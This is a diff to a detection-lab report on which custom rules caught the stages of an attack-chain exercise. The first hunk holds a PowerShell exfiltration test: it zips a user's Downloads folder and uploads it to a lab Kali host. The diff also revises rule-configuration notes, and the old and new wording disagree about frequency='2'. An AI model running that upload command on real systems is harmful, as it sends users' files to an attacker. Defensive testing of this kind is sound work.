@@ -845,7 +845,7 @@ Security audit-log clearing was detected by custom rule `100412` during the Octo
 
 ```powershell
 Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force
-Invoke-WebRequest -Uri "http://192.168.60.135:8000/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
+Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile C:\Windows\Temp\exfil_test.zip
 ```
 
 **Current Kali script (committed):**
@@ -927,7 +927,7 @@ The chain was run in several sessions: Stages 1–7 on 2026-08-28, Stages 8–10
 **Reading the results**
 
 - **Coverage is partial, not a complete end-to-end chain.** The saved results include seven stages with raw alerts from their expected custom rule, Stage 3 supported only by built-in `92657`, and Stage 9 supported by screenshots. Stage 1 and Stage 11 lack convincing stage-specific proof; optional Stage 8b lacks a positive LSASS test. Stage 0 is setup, not an attack action.
-- **Precedence and configuration history:** Stages 5, 7 and 10 have positive retest evidence. For Stage 3, the 2026-10-10 test matched built-in `92657`; current XML has since changed to `if_sid=92657`, but `100410` has **not** been validated after that change. Do not describe the old `60106` parent or the historical `frequency="2"` (which has now been removed) as the live configuration.
+- **Precedence and configuration history:** Stages 5, 7 and 10 have positive retest evidence. For Stage 3, the 2026-10-10 test matched built-in `92657`; current XML has since changed to `if_sid=92657`, but `100410` has **not** been validated after that change.The current 100410 configuration uses if_sid=92657, if_matched_sid=100408, frequency="2" and timeframe="200". The October 10 evidence predates this revision, so its correlation behavior remains pending validation.
 - **Stage 8b shows telemetry, not detection quality.** Defender's scan reached the rule engine and only the built-in `92900` alerted; that does not show that `100411`'s filters work (see Stage 8b), and a real LSASS access has not been tested.
 - Network detections (Suricata) remain reliable: three of the seven custom rules proven are Suricata rules; the rest are now Sysmon/Windows rules after the latest re-tests.
 
